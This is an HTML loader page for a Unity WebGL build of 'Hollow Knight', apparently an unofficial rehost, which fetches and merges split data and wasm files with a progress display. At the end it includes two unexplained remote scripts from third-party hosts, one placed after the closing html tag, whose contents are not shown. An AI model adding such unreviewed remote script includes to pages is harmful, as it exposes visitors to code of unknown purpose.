<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Unity WebGL Player | Hollow Knight</title>
  <link rel="shortcut icon" href="TemplateData/favicon.ico">
  <link rel="stylesheet" href="TemplateData/style.css">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      background: #231F20;
    }
    #unity-container {
      width: 100%;
      height: 100%;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
</head>

<body>
  <div id="loading-text" style="color: white; font-size: 48px; font-family: cursive; text-align: center; margin-top: 20px;">LOADING...</div>
  <div hidden id="unity-container" class="unity-desktop">
    <canvas id="unity-canvas"></canvas>
    <div id="unity-loading-bar">
      <div id="unity-logo"></div>
      <div id="unity-progress-bar-empty">
        <div id="unity-progress-bar-full"></div>
      </div>
    </div>
    <div id="unity-mobile-warning">WebGL builds are not supported on mobile devices.</div>
  </div>

  <script>
    const loadingText = document.querySelector("#loading-text");
    let totalBytes = 0;
    let loadedBytes = 0;

    async function getSize(url) {
      try {
        const res = await fetch(url, { method: "HEAD" });
        return parseInt(res.headers.get("Content-Length") || "0", 10);
      } catch {
        return 0;
      }
    }

    async function fetchWithProgress(url) {
      const response = await fetch(url);
      const reader = response.body.getReader();
      const chunks = [];
      let received = 0;

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        received += value.length;
        loadedBytes += value.length;
        chunks.push(value);

        const mbDone = (loadedBytes / (1024 * 1024)).toFixed(2);
        const mbTotal = '909.17';
        loadingText.textContent = `LOADING... ${mbDone} MB / ${mbTotal} MB`;
      }

      const fullBuffer = new Uint8Array(received);
      let offset = 0;
      for (const chunk of chunks) {
        fullBuffer.set(chunk, offset);
        offset += chunk.length;
      }
      return fullBuffer.buffer;
    }

    async function mergeFiles(fileParts) {
      const buffers = await Promise.all(fileParts.map(part => fetchWithProgress(part)));
      const mergedBlob = new Blob(buffers);
      return URL.createObjectURL(mergedBlob);
    }

    function getParts(file, start, end) {
      const parts = [];
      for (let i = start; i <= end; i++) {
        parts.push(`${file}.part${i}`);
      }
      return parts;
    }

    (async () => {
      const allParts = [
        ...getParts("./Build/bog.data", 1, 44),
        ...getParts("./Build/bog.wasm", 1, 2)
      ];

      const sizes = await Promise.all(allParts.map(getSize));
      totalBytes = sizes.reduce((a, b) => a + b, 0);

      const [dataUrl, wasmUrl] = await Promise.all([
        mergeFiles(getParts("./Build/bog.data", 1, 44)),
        mergeFiles(getParts("./Build/bog.wasm", 1, 2))
      ]);

      const buildUrl = "./Build";
      const loaderUrl = `${buildUrl}/bog.loader.js`;

      const config = {
        dataUrl: dataUrl,
        frameworkUrl: `${buildUrl}/bog.framework.js`,
        codeUrl: wasmUrl,
        streamingAssetsUrl: "StreamingAssets",
        companyName: "Team Cherry & Truffled",
        productName: "Hollow Knight",
        productVersion: "1.0"
      };

      const container = document.querySelector("#unity-container");
      container.hidden = false;
      const canvas = document.querySelector("#unity-canvas");
      const loadingBar = document.querySelector("#unity-loading-bar");
      const progressBarFull = document.querySelector("#unity-progress-bar-full");
      const mobileWarning = document.querySelector("#unity-mobile-warning");

      if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
        container.className = "unity-mobile";
        config.devicePixelRatio = 1;
        mobileWarning.style.display = "block";
        setTimeout(() => (mobileWarning.style.display = "none"), 5000);
      } else {
        function resizeCanvas() {
          canvas.width = window.innerWidth;
          canvas.height = window.innerHeight;
          canvas.style.width = window.innerWidth + "px";
          canvas.style.height = window.innerHeight + "px";
        }
        resizeCanvas();
        window.addEventListener("resize", resizeCanvas);
      }

      loadingBar.style.display = "block";

      const script = document.createElement("script");
      script.src = loaderUrl;
      script.onload = () => {
        createUnityInstance(canvas, config, (progress) => {
          progressBarFull.style.width = 100 * progress + "%";
        }).then((unityInstance) => {
          loadingText.remove();
          loadingBar.style.display = "none";
          canvas.style.display = "block";
        }).catch((message) => {
          alert(message);
        });
      };
      document.body.appendChild(script);
    })();
  </script>
<script src="https://help.voidium.uk/lib/fps.js"></script>
</body>
</html>
<script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
